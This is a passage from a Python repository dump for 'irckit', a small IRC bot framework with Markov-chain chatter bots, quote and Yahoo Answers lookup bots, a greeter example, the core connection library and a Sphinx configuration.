                            messages.append((person, generated))
        
        if len(messages):
            self.last, message = random.choice(messages)
            return message


    def load_log_file(self, filename):
        fh = open(filename, 'r')
        logline_re = re.compile('<\s*(\w+)>[^\]]+\]\s([^\r\n]+)[\r\n]')
        for line in fh.readlines():
            match = logline_re.search(line)
            if match:
                sender, message = match.groups()
                self.log(sender, message, '', False, None)

    def load_text_file(self, filename, sender):
        fh = open(filename, 'r')
        for line in fh.readlines():
            self.log(sender, line, '', False, None)
    
    def command_patterns(self):
        return (
            self.ping('^imitate \S+', self.imitate),
            self.ping('^cite', self.cite),
            ('.*', self.log),
        )


host = 'irc.freenode.net'
port = 6667
nick = 'whatyousay'

conn = IRCConnection(host, port, nick)
markov_bot = MarkovBot(conn)

if len(sys.argv) > 1 and sys.argv[1] == '-log':
    if len(sys.argv) == 3:
        markov_bot.load_log_file(sys.argv[2])
    elif len(sys.argv):
        markov_bot.load_text_file(sys.argv[2], sys.argv[3])
else:
    conn.connect()
    conn.join('#botwars')
    try:
        conn.enter_event_loop()
    except:
        pass

markov_bot.save_data()

########NEW FILE########
__FILENAME__ = quote
import httplib2
import random
import re
import urllib

from BeautifulSoup import BeautifulSoup

from irc import IRCBot, run_bot


class QuoteBot(IRCBot):
    last_message = ''
    
    def fetch_result(self, phrase):
        sock = httplib2.Http(timeout=1)
        
        headers, response = sock.request(
            'http://www.esvapi.org/v2/rest/passageQuery?key=TEST&q=%s&include-headings=false' % (
            urllib.quote(phrase)
        ))
        if headers['status'] in (200, '200'):
            return self.random_from(response)
    
    def random_from(self, response):
        soup = BeautifulSoup(response)
        results = soup.findAll('p', {'class': 'search-result'})
        if not len(results):
            return
        
        quote = results[random.randint(0, len(results) - 1)]
        chap = quote.find('a').string
        ghetto_parsed = re.search('<br />(.*)</p>', str(quote)).groups()[0]
        no_html = re.sub('<[^\>]+>', '', ghetto_parsed)
        no_charrefs = re.sub('&[^\;]+;', '', no_html)
        return chap, no_charrefs
    
    def display(self, sender, message, channel):
        if self.is_ping(message):
            query = self.fix_ping(message)
            result = self.fetch_result(query)
            if result:
                return '%s: %s' % (result[0], result[1])
        else:
            self.last_message = message
    
    def contextualize(self, sender, message, channel):
        result = self.fetch_result(self.last_message)
        if result:
            return '%s: %s' % (result[0], result[1])
    
    def command_patterns(self):
        return (
            ('^contextualize', self.contextualize),
            ('', self.display),
        )


host = 'irc.freenode.net'
port = 6667
nick = 'quote_bot'

run_bot(QuoteBot, host, port, nick, ['#botwars'])

########NEW FILE########
__FILENAME__ = redisbot
#!/usr/bin/python
import random
import re
import redis

from irc import IRCBot, run_bot


class MarkovBot(IRCBot):
    """
    http://code.activestate.com/recipes/194364-the-markov-chain-algorithm/
    http://github.com/ericflo/yourmomdotcom
    """
    chain_length = 2
    chattiness = .01
    max_words = 30
    messages_to_generate = 5
    prefix = 'irc'
    separator = '\x01'
    stop_word = '\x02'
    
    def __init__(self, *args, **kwargs):
        super(MarkovBot, self).__init__(*args, **kwargs)
        
        self.redis_conn = redis.Redis()
    
    def make_key(self, k):
        return '-'.join((self.prefix, k))
    
    def sanitize_message(self, message):
        return re.sub('[\"\']', '', message.lower())

    def split_message(self, message):
        # split the incoming message into words, i.e. ['what', 'up', 'bro']
        words = message.split()
        
        # if the message is any shorter, it won't lead anywhere
        if len(words) > self.chain_length:
            
            # add some stop words onto the message
            # ['what', 'up', 'bro', '\x02']
            words.append(self.stop_word)
            
            # len(words) == 4, so range(4-2) == range(2) == 0, 1, meaning
            # we return the following slices: [0:3], [1:4]
            # or ['what', 'up', 'bro'], ['up', 'bro', '\x02']
            for i in range(len(words) - self.chain_length):
                yield words[i:i + self.chain_length + 1]
    
    def generate_message(self, seed):
        key = seed
        
        # keep a list of words we've seen
        gen_words = []
        
        # only follow the chain so far, up to <max words>
        for i in xrange(self.max_words):
        
            # split the key on the separator to extract the words -- the key
            # might look like "this\x01is" and split out into ['this', 'is']
            words = key.split(self.separator)
            
            # add the word to the list of words in our generated message
            gen_words.append(words[0])
            
            # get a new word that lives at this key -- if none are present we've
            # reached the end of the chain and can bail
            next_word = self.redis_conn.srandmember(self.make_key(key))
            if not next_word:
                break
            
            # create a new key combining the end of the old one and the next_word
            key = self.separator.join(words[1:] + [next_word])

        return ' '.join(gen_words)

    def log(self, sender, message, channel):
        # speak only when spoken to, or when the spirit moves me
        say_something = self.is_ping(message) or (
            sender != self.conn.nick and random.random() < self.chattiness
        )
        
        messages = []
        
        # use a convenience method to strip out the "ping" portion of a message
        if self.is_ping(message):
            message = self.fix_ping(message)
        
        if message.startswith('/'):
            return

        # split up the incoming message into chunks that are 1 word longer than
        # the size of the chain, e.g. ['what', 'up', 'bro'], ['up', 'bro', '\x02']
        for words in self.split_message(self.sanitize_message(message)):
            # grab everything but the last word
            key = self.separator.join(words[:-1])
            
            # add the last word to the set
            self.redis_conn.sadd(self.make_key(key), words[-1])
            
            # if we should say something, generate some messages based on what
            # was just said and select the longest, then add it to the list
            if say_something:
                best_message = ''
                for i in range(self.messages_to_generate):
                    generated = self.generate_message(seed=key)
                    if len(generated) > len(best_message):
                        best_message = generated
                
                if best_message:
                    messages.append(best_message)
        
        if len(messages):
            return random.choice(messages)

    def command_patterns(self):
        return (
            ('.*', self.log),
        )


host = 'irc.freenode.net'
port = 6667
nick = 'whatyousay'

run_bot(MarkovBot, host, port, nick, ['#lawrence-botwars'])

########NEW FILE########
__FILENAME__ = yahoo
import httplib2
import json
import re
import urllib

from irc import IRCBot, run_bot


class YahooAnswersBot(IRCBot):
    def get_json(self, url):
        sock = httplib2.Http(timeout=4)
        headers, response = sock.request(url)
        if headers['status'] in (200, '200'):
            return json.loads(response)
    
    def fetch_answer(self, query):
        question_search = self.get_json(
            'http://answers.yahooapis.com/AnswersService/V1/questionSearch?appid=YahooDemo&query=%s&output=json' % \
            urllib.quote(query)
        )
        if len(question_search['all']['questions']):
            question_id = question_search['all']['questions'][0]['Id']
            answer_data = self.get_json(
                'http://answers.yahooapis.com/AnswersService/V1/getQuestion?appid=YahooDemo&question_id=%s&output=json' % \
                urllib.quote(question_id)
            )
            chosen = answer_data['all']['question'][0]['ChosenAnswer']
            return chosen.encode('utf-8', 'replace')
    
    def answer(self, sender, message, channel):
        result = self.fetch_answer(message)
        if result:
            return re.sub('[\r\n ]+', ' ', result).strip()
    
    def command_patterns(self):
        return (
            self.ping('^\S+', self.answer),
        )


host = 'irc.freenode.net'
port = 6667
nick = 'answer_bot'
run_bot(YahooAnswersBot, host, port, nick, ['#botwars'])

########NEW FILE########
__FILENAME__ = conf
# -*- coding: utf-8 -*-
#
# irckit documentation build configuration file, created by
# sphinx-quickstart on Sat Apr 21 10:39:40 2012.
#
# This file is execfile()d with the current directory set to its containing dir.
#
# Note that not all possible configuration values are present in this
# autogenerated file.
#
# All configuration values have a default; values that are commented out
# serve to show the default.

import sys, os

# If extensions (or modules to document with autodoc) are in another directory,
# add these directories to sys.path here. If the directory is relative to the
# documentation root, use os.path.abspath to make it absolute, like shown here.
#sys.path.insert(0, os.path.abspath('.'))

# -- General configuration -----------------------------------------------------

# If your documentation needs a minimal Sphinx version, state it here.
#needs_sphinx = '1.0'

# Add any Sphinx extension module names here, as strings. They can be extensions
# coming with Sphinx (named 'sphinx.ext.*') or your custom ones.
extensions = []

# Add any paths that contain templates here, relative to this directory.
templates_path = ['_templates']

# The suffix of source filenames.
source_suffix = '.rst'

# The encoding of source files.
#source_encoding = 'utf-8-sig'

# The master toctree document.
master_doc = 'index'

# General information about the project.
project = u'irckit'
copyright = u'2012, charles leifer'

# The version info for the project you're documenting, acts as replacement for
# |version| and |release|, also used in various other places throughout the
# built documents.
#
# The short X.Y version.
version = '0.1.0'
# The full version, including alpha/beta/rc tags.
release = '0.1.0'

# The language for content autogenerated by Sphinx. Refer to documentation
# for a list of supported languages.
#language = None

# There are two options for replacing |today|: either, you set today to some
# non-false value, then it is used:
#today = ''
# Else, today_fmt is used as the format for a strftime call.
#today_fmt = '%B %d, %Y'

# List of patterns, relative to source directory, that match files and
# directories to ignore when looking for source files.
exclude_patterns = ['_build']

# The reST default role (used for this markup: `text`) to use for all documents.
#default_role = None

# If true, '()' will be appended to :func: etc. cross-reference text.
#add_function_parentheses = True

# If true, the current module name will be prepended to all description
# unit titles (such as .. function::).
#add_module_names = True

# If true, sectionauthor and moduleauthor directives will be shown in the
# output. They are ignored by default.
#show_authors = False

# The name of the Pygments (syntax highlighting) style to use.
pygments_style = 'sphinx'

# A list of ignored prefixes for module index sorting.
#modindex_common_prefix = []


# -- Options for HTML output ---------------------------------------------------

# The theme to use for HTML and HTML Help pages.  See the documentation for
# a list of builtin themes.
html_theme = 'default'

# Theme options are theme-specific and customize the look and feel of a theme
# further.  For a list of options available for each theme, see the
# documentation.
#html_theme_options = {}

# Add any paths that contain custom themes here, relative to this directory.
#html_theme_path = []

# The name for this set of Sphinx documents.  If None, it defaults to
# "<project> v<release> documentation".
#html_title = None

# A shorter title for the navigation bar.  Default is the same as html_title.
#html_short_title = None

# The name of an image file (relative to this directory) to place at the top
# of the sidebar.
#html_logo = None

# The name of an image file (within the static path) to use as favicon of the
# docs.  This file should be a Windows icon file (.ico) being 16x16 or 32x32
# pixels large.
#html_favicon = None

# Add any paths that contain custom static files (such as style sheets) here,
# relative to this directory. They are copied after the builtin static files,
# so a file named "default.css" will overwrite the builtin "default.css".
html_static_path = ['_static']

# If not '', a 'Last updated on:' timestamp is inserted at every page bottom,
# using the given strftime format.
#html_last_updated_fmt = '%b %d, %Y'

# If true, SmartyPants will be used to convert quotes and dashes to
# typographically correct entities.
#html_use_smartypants = True

# Custom sidebar templates, maps document names to template names.
#html_sidebars = {}

# Additional templates that should be rendered to pages, maps page names to
# template names.
#html_additional_pages = {}

# If false, no module index is generated.
#html_domain_indices = True

# If false, no index is generated.
#html_use_index = True

# If true, the index is split into individual pages for each letter.
#html_split_index = False

# If true, links to the reST sources are added to the pages.
#html_show_sourcelink = True

# If true, "Created using Sphinx" is shown in the HTML footer. Default is True.
#html_show_sphinx = True

# If true, "(C) Copyright ..." is shown in the HTML footer. Default is True.
#html_show_copyright = True

# If true, an OpenSearch description file will be output, and all pages will
# contain a <link> tag referring to it.  The value of this option must be the
# base URL from which the finished HTML is served.
#html_use_opensearch = ''

# This is the file name suffix for HTML files (e.g. ".xhtml").
#html_file_suffix = None

# Output file base name for HTML help builder.
htmlhelp_basename = 'irckitdoc'


# -- Options for LaTeX output --------------------------------------------------

latex_elements = {
# The paper size ('letterpaper' or 'a4paper').
#'papersize': 'letterpaper',

# The font size ('10pt', '11pt' or '12pt').
#'pointsize': '10pt',

# Additional stuff for the LaTeX preamble.
#'preamble': '',
}

# Grouping the document tree into LaTeX files. List of tuples
# (source start file, target name, title, author, documentclass [howto/manual]).
latex_documents = [
  ('index', 'irckit.tex', u'irckit Documentation',
   u'charles leifer', 'manual'),
]

# The name of an image file (relative to this directory) to place at the top of
# the title page.
#latex_logo = None

# For "manual" documents, if this is true, then toplevel headings are parts,
# not chapters.
#latex_use_parts = False

# If true, show page references after internal links.
#latex_show_pagerefs = False

# If true, show URL addresses after external links.
#latex_show_urls = False

# Documents to append as an appendix to all manuals.
#latex_appendices = []

# If false, no module index is generated.
#latex_domain_indices = True


# -- Options for manual page output --------------------------------------------

# One entry per manual page. List of tuples
# (source start file, name, description, authors, manual section).
man_pages = [
    ('index', 'irckit', u'irckit Documentation',
     [u'charles leifer'], 1)
]

# If true, show URL addresses after external links.
#man_show_urls = False


# -- Options for Texinfo output ------------------------------------------------

# Grouping the document tree into Texinfo files. List of tuples
# (source start file, target name, title, author,
#  dir menu entry, description, category)
texinfo_documents = [
  ('index', 'irckit', u'irckit Documentation',
   u'charles leifer', 'irckit', 'One line description of project.',
   'Miscellaneous'),
]

# Documents to append as an appendix to all manuals.
#texinfo_appendices = []

# If false, no module index is generated.
#texinfo_domain_indices = True

# How to display URL addresses: 'footnote', 'no', or 'inline'.
#texinfo_show_urls = 'footnote'

########NEW FILE########
__FILENAME__ = example
from irc import IRCBot, run_bot


class GreeterBot(IRCBot):
    def greet(self, nick, message, channel):
        return 'Hi, %s' % nick
    
    def command_patterns(self):
        return (
            self.ping('^hello', self.greet),
        )


host = 'irc.freenode.net'
port = 6667
nick = 'greeterbot'

run_bot(GreeterBot, host, port, nick, ['#botwars'])

########NEW FILE########
__FILENAME__ = irc
import logging
import os
import random
import re
import sys
import time

try:
    from gevent import socket
except ImportError:
    import socket

from logging.handlers import RotatingFileHandler
from optparse import OptionParser


class IRCConnection(object):
    """\
    Connection class for connecting to IRC servers
    """
    # a couple handy regexes for reading text
    nick_re = re.compile('.*?Nickname is already in use')
    nick_change_re = re.compile(':(?P<old_nick>.*?)!\S+\s+?NICK\s+:\s*(?P<new_nick>[-\w]+)')
    ping_re = re.compile('^PING (?P<payload>.*)')
    chanmsg_re = re.compile(':(?P<nick>.*?)!\S+\s+?PRIVMSG\s+(?P<channel>#+[-\w]+)\s+:(?P<message>[^\n\r]+)')
    privmsg_re = re.compile(':(?P<nick>.*?)!~\S+\s+?PRIVMSG\s+[^#][^:]+:(?P<message>[^\n\r]+)')
    part_re = re.compile(':(?P<nick>.*?)!\S+\s+?PART\s+(?P<channel>#+[-\w]+)')
    join_re = re.compile(':(?P<nick>.*?)!\S+\s+?JOIN\s+.*?(?P<channel>#+[-\w]+)')
    quit_re = re.compile(':(?P<nick>.*?)!\S+\s+?QUIT\s+.*')
    registered_re = re.compile(':(?P<server>.*?)\s+(?:376|422)')

    # mapping for logging verbosity
    verbosity_map = {
        0: logging.ERROR,
        1: logging.INFO,
        2: logging.DEBUG,
    }

    def __init__(self, server, port, nick, logfile=None, verbosity=1, needs_registration=True):
        self.server = server
        self.port = port
        self.nick = self.base_nick = nick

        self.logfile = logfile
        self.verbosity = verbosity

        self._registered = not needs_registration
        self._out_buffer = []
        self._callbacks = []
        self.logger = self.get_logger('ircconnection.logger', self.logfile)

    def get_logger(self, logger_name, filename):
        log = logging.getLogger(logger_name)
        log.setLevel(self.verbosity_map.get(self.verbosity, logging.INFO))

        if self.logfile:
            handler = RotatingFileHandler(filename, maxBytes=1024*1024, backupCount=2)
            handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
            log.addHandler(handler)

        if self.verbosity == 2 or not self.logfile:
            stream_handler = logging.StreamHandler()
            stream_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
            log.addHandler(stream_handler)

        return log

    def send(self, data, force=False):
        """\
        Send raw data over the wire if connection is registered. Otherewise,
        save the data to an output buffer for transmission later on.
        If the force flag is true, always send data, regardless of
        registration status.
        """
        if self._registered or force:
            self._sock_file.write('%s\r\n' % data)
            self._sock_file.flush()
        else:
            self._out_buffer.append(data)

    def connect(self):
        """\
        Connect to the IRC server using the nickname
        """
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self._sock.connect((self.server, self.port))
        except socket.error:
            self.logger.error('Unable to connect to %s on port %d' % (self.server, self.port), exc_info=1)
            return False

        self._sock_file = self._sock.makefile()
        self.register_nick()
        self.register()
        return True

    def close(self):
        self._sock.close()

    def register_nick(self):
        self.logger.info('Registering nick %s' % self.nick)
        self.send('NICK %s' % self.nick, True)

    def register(self):
        self.logger.info('Authing as %s' % self.nick)
        self.send('USER %s %s bla :%s' % (self.nick, self.server, self.nick), True)

    def join(self, channel):
        if not channel.startswith('#'):
            channel = '#%s' % channel
        self.send('JOIN %s' % channel)
        self.logger.debug('joining %s' % channel)

    def part(self, channel):
        if not channel.startswith('#'):
            channel = '#%s' % channel
        self.send('PART %s' % channel)
        self.logger.debug('leaving %s' % channel)

    def respond(self, message, channel=None, nick=None):
        """\
        Multipurpose method for sending responses to channel or via message to
        a single user
        """
        if channel:
            if not channel.startswith('#'):
                channel = '#%s' % channel
            self.send('PRIVMSG %s :%s' % (channel, message))
        elif nick:
            self.send('PRIVMSG %s :%s' % (nick, message))

    def dispatch_patterns(self):
        """\
        Low-level dispatching of socket data based on regex matching, in general
        handles

        * In event a nickname is taken, registers under a different one
        * Responds to periodic PING messages from server
        * Dispatches to registered callbacks when
            - any user leaves or enters a room currently connected to
            - a channel message is observed
            - a private message is received
        """
        return (
            (self.nick_re, self.new_nick),
            (self.nick_change_re, self.handle_nick_change),
            (self.ping_re, self.handle_ping),
            (self.part_re, self.handle_part),
            (self.join_re, self.handle_join),
            (self.quit_re, self.handle_quit),
            (self.chanmsg_re, self.handle_channel_message),
            (self.privmsg_re, self.handle_private_message),
            (self.registered_re, self.handle_registered),
        )

    def register_callbacks(self, callbacks):
        """\
        Hook for registering custom callbacks for dispatch patterns
        """
        self._callbacks.extend(callbacks)

    def new_nick(self):
        """\
        Generates a new nickname based on original nickname followed by a
        random number
        """
        old = self.nick
        self.nick = '%s_%s' % (self.base_nick, random.randint(1, 1000))
        self.logger.warn('Nick %s already taken, trying %s' % (old, self.nick))
        self.register_nick()
        self.handle_nick_change(old, self.nick)

    def handle_nick_change(self, old_nick, new_nick):
        for pattern, callback in self._callbacks:
            if pattern.match('/nick'):
                callback(old_nick, '/nick', new_nick)

    def handle_ping(self, payload):
        """\
        Respond to periodic PING messages from server
        """
        self.logger.info('server ping: %s' % payload)
        self.send('PONG %s' % payload, True)

    def handle_registered(self, server):
        """\
        When the connection to the server is registered, send all pending
        data.
        """
        if not self._registered:
            self.logger.info('Registered')
            self._registered = True
            for data in self._out_buffer:
                self.send(data)
            self._out_buffer = []

    def handle_part(self, nick, channel):
        for pattern, callback in self._callbacks:
            if pattern.match('/part'):
                callback(nick, '/part', channel)

    def handle_join(self, nick, channel):
        for pattern, callback in self._callbacks:
            if pattern.match('/join'):
                callback(nick, '/join', channel)

    def handle_quit(self, nick):
        for pattern, callback in self._callbacks:
            if pattern.match('/quit'):
                callback(nick, '/quit', None)

    def _process_command(self, nick, message, channel):
        results = []

        for pattern, callback in self._callbacks:
            match = pattern.match(message) or pattern.match('/privmsg')
            if match:
                results.append(callback(nick, message, channel, **match.groupdict()))

        return results

    def handle_channel_message(self, nick, channel, message):
        for result in self._process_command(nick, message, channel):
            if result:
                self.respond(result, channel=channel)

    def handle_private_message(self, nick, message):
        for result in self._process_command(nick, message, None):
            if result:
                self.respond(result, nick=nick)

    def enter_event_loop(self):
        """\
        Main loop of the IRCConnection - reads from the socket and dispatches
        based on regex matching
        """
        patterns = self.dispatch_patterns()
        self.logger.debug('entering receive loop')

        while 1:
            try:
                data = self._sock_file.readline()
            except socket.error:
                data = None

            if not data:
                self.logger.info('server closed connection')
                self.close()
                return True

            data = data.rstrip()

            for pattern, callback in patterns:
                match = pattern.match(data)
                if match:
                    callback(**match.groupdict())


class IRCBot(object):
    """\
    A class that interacts with the IRCConnection class to provide a simple way
    of registering callbacks and scripting IRC interactions
    """
    def __init__(self, conn):
        self.conn = conn

        # register callbacks with the connection
        self.register_callbacks()

    def register_callbacks(self):
        """\
        Hook for registering callbacks with connection -- handled by __init__()
        """
        self.conn.register_callbacks((
            (re.compile(pattern), callback) \
                for pattern, callback in self.command_patterns()
        ))

    def _ping_decorator(self, func):
        def inner(nick, message, channel, **kwargs):
            message = re.sub('^%s[:,\s]\s*' % self.conn.nick, '', message)
            return func(nick, message, channel, **kwargs)
        return inner

    def is_ping(self, message):
        return re.match('^%s[:,\s]' % self.conn.nick, message) is not None

    def fix_ping(self, message):
        return re.sub('^%s[:,\s]\s*' % self.conn.nick, '', message)

    def ping(self, pattern, callback):
        return (
            '^%s[:,\s]\s*%s' % (self.conn.nick, pattern.lstrip('^')),
            self._ping_decorator(callback),
        )

    def command_patterns(self):
        """\
        Hook for defining callbacks, stored as a tuple of 2-tuples:

        return (
            ('/join', self.room_greeter),
            ('!find (^\s+)', self.handle_find),
        )
        """
        raise NotImplementedError

    def respond(self, message, channel=None, nick=None):
        """\
        Wraps the connection object's respond() method
        """
        self.conn.respond(message, channel, nick)


def run_bot(bot_class, host, port, nick, channels=None):
    """\
    Convenience function to start a bot on the given network, optionally joining
    some channels
    """
    conn = IRCConnection(host, port, nick)
    bot_instance = bot_class(conn)

    while 1:
        if not conn.connect():
            break

        channels = channels or []

        for channel in channels:
            conn.join(channel)

        conn.enter_event_loop()


class SimpleSerialize(object):
    """\
    Allow simple serialization of data in IRC messages with minimum of space.

    * Only supports dictionaries *
    """
    def serialize(self, dictionary):
        return '|'.join(('%s:%s' % (k, v) for k, v in dictionary.iteritems()))

    def deserialize(self, string):
        return dict((piece.split(':', 1) for piece in string.split('|')))

########NEW FILE########
